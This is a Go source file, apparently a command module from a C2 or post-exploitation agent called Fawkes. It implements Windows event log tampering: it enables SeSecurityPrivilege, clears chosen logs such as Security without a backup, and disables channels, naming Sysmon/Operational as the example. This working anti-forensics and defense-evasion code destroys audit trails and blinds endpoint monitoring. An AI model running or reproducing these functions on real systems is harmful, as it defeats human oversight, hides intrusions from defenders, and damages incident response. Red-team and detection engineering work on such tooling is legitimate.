//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

func evtClear(channel string) structs.CommandResult {
	if channel == "" {
		return errorResult("Channel is required for clear action (e.g., Security, System, Application)")
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Enable SeSecurityPrivilege for Security log
	enableSecurityPrivilege()
	enableThreadSecurityPrivilege()

	// Get count before clearing
	countBefore := evtGetRecordCount(channel)

	channelPtr, _ := windows.UTF16PtrFromString(channel)
	ret, _, err := procEvtClearLog.Call(
		0,
		uintptr(unsafe.Pointer(channelPtr)),
		0, // No backup
		0,
	)
	if ret == 0 {
		return errorf("EvtClearLog failed for '%s': %v\nEnsure you have sufficient privileges (Administrator/SYSTEM for Security log).", channel, err)
	}

	msg := fmt.Sprintf("Successfully cleared '%s' event log", channel)
	if countBefore > 0 {
		msg += fmt.Sprintf(" (%d events removed)", countBefore)
	}
	msg += "\nNote: Event ID 1102 (log cleared) is automatically recorded in Security."

	return successResult(msg)
}

func evtInfo(channel string) structs.CommandResult {
	if channel == "" {
		return errorResult("Channel is required for info action (e.g., Security, System, Application)")
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	channelPtr, _ := windows.UTF16PtrFromString(channel)
	logHandle, _, err := procEvtOpenLog.Call(
		0,
		uintptr(unsafe.Pointer(channelPtr)),
		evtOpenChannelPath,
	)
	if logHandle == 0 {
		return errorf("EvtOpenLog failed for '%s': %v", channel, err)
	}
	defer procEvtClose.Call(logHandle)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Event Log Info: %s\n\n", channel))

	// Record count
	count := evtGetLogProperty(logHandle, evtLogNumberOfLogRecords)
	sb.WriteString(fmt.Sprintf("  Records:     %d\n", count))

	// File size
	size := evtGetLogProperty(logHandle, evtLogFileSize)
	sb.WriteString(fmt.Sprintf("  File Size:   %s\n", formatBytes(size)))

	// Last write time
	lastWrite := evtGetLogProperty(logHandle, evtLogLastWriteTime)
	if lastWrite > 0 {
		sb.WriteString(fmt.Sprintf("  Last Write:  %s\n", windowsFileTimeToString(lastWrite)))
	}

	return successResult(sb.String())
}

func evtGetLogProperty(logHandle uintptr, propertyID uintptr) uint64 {
	// EVT_VARIANT: 8 bytes value + 4 bytes count + 4 bytes type = 16 bytes
	var buf [16]byte
	var bufUsed uint32
	ret, _, _ := procEvtGetLogInfo.Call(
		logHandle,
		propertyID,
		16,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bufUsed)),
	)
	if ret == 0 {
		return 0
	}
	return binary.LittleEndian.Uint64(buf[:8])
}

func evtGetRecordCount(channel string) uint64 {
	channelPtr, _ := windows.UTF16PtrFromString(channel)
	logHandle, _, _ := procEvtOpenLog.Call(
		0,
		uintptr(unsafe.Pointer(channelPtr)),
		evtOpenChannelPath,
	)
	if logHandle == 0 {
		return 0
	}
	defer procEvtClose.Call(logHandle)
	return evtGetLogProperty(logHandle, evtLogNumberOfLogRecords)
}

func renderEventXML(eventHandle uintptr) (string, error) {
	var bufUsed, propCount uint32

	// First call to get required size
	procEvtRender.Call(
		0,
		eventHandle,
		evtRenderEventXml,
		0,
		0,
		uintptr(unsafe.Pointer(&bufUsed)),
		uintptr(unsafe.Pointer(&propCount)),
	)

	if bufUsed == 0 {
		return "", fmt.Errorf("EvtRender sizing returned 0")
	}

	buf := make([]byte, bufUsed)
	ret, _, err := procEvtRender.Call(
		0,
		eventHandle,
		evtRenderEventXml,
		uintptr(bufUsed),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bufUsed)),
		uintptr(unsafe.Pointer(&propCount)),
	)
	if ret == 0 {
		return "", fmt.Errorf("EvtRender failed: %w", err)
	}

	// Convert UTF-16LE to string
	u16 := unsafe.Slice((*uint16)(unsafe.Pointer(&buf[0])), bufUsed/2)
	return windows.UTF16ToString(u16), nil
}

// evtSetChannelEnabled enables or disables an event log channel via EvtOpenChannelConfig API.
func evtSetChannelEnabled(channel string, enabled bool) structs.CommandResult {
	if channel == "" {
		return errorResult("Channel is required for enable/disable action (e.g., Microsoft-Windows-Sysmon/Operational)")
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	channelPtr, _ := windows.UTF16PtrFromString(channel)

	// Open channel configuration
	cfgHandle, _, err := procEvtOpenChannelConfig.Call(
		0,
		uintptr(unsafe.Pointer(channelPtr)),
		0,
	)
	if cfgHandle == 0 {
		return errorf("EvtOpenChannelConfig failed for '%s': %v", channel, err)
	}
	defer procEvtClose.Call(cfgHandle)

	// Read current enabled state
	var propBuf [16]byte // EVT_VARIANT: 8 bytes value + 4 count + 4 type
	var propBufUsed uint32
	procEvtGetChannelConfigProp.Call(
		cfgHandle,
		evtChannelConfigEnabled,
		16,
		uintptr(unsafe.Pointer(&propBuf[0])),
		uintptr(unsafe.Pointer(&propBufUsed)),
	)
	wasEnabled := propBuf[0] != 0

	// Set the Enabled property
	// EVT_VARIANT for bool: Type=13 (EvtVarTypeBoolean), value is uint32 (0 or 1)
	var variant [16]byte
	if enabled {
		binary.LittleEndian.PutUint32(variant[:4], 1)
	} else {
		binary.LittleEndian.PutUint32(variant[:4], 0)
	}
	binary.LittleEndian.PutUint32(variant[12:16], 13) // EvtVarTypeBoolean = 13

	ret, _, err := procEvtSetChannelConfigProp.Call(
		cfgHandle,
		evtChannelConfigEnabled,
		0,
		uintptr(unsafe.Pointer(&variant[0])),
	)
	if ret == 0 {
		return errorf("EvtSetChannelConfigProperty failed for '%s': %v", channel, err)
	}

	// Save the configuration
	ret, _, err = procEvtSaveChannelConfig.Call(cfgHandle, 0)
	if ret == 0 {
		return errorf("EvtSaveChannelConfig failed for '%s': %v\nEnsure you have administrator privileges.", channel, err)
	}

	action := "Enabled"
	if !enabled {
		action = "Disabled"
	}
	previousState := "enabled"
	if !wasEnabled {
		previousState = "disabled"
	}

	return successf("%s event log channel '%s' (was: %s)", action, channel, previousState)
}

// enableSecurityPrivilege enables SeSecurityPrivilege on the process token
func enableSecurityPrivilege() error {
	var token windows.Token
	processHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return fmt.Errorf("failed to get current process handle: %w", err)
	}
	err = windows.OpenProcessToken(processHandle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("failed to open process token: %w", err)
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeSecurityPrivilege"), &luid)
	if err != nil {
		return fmt.Errorf("failed to lookup SeSecurityPrivilege LUID: %w", err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
}

// enableThreadSecurityPrivilege enables SeSecurityPrivilege on the thread impersonation token
func enableThreadSecurityPrivilege() error {
	var token windows.Token
	err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, false, &token)
	if err != nil {
		return fmt.Errorf("failed to open thread token: %w", err)
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeSecurityPrivilege"), &luid)
	if err != nil {
		return fmt.Errorf("failed to lookup SeSecurityPrivilege LUID: %w", err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	return windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
}
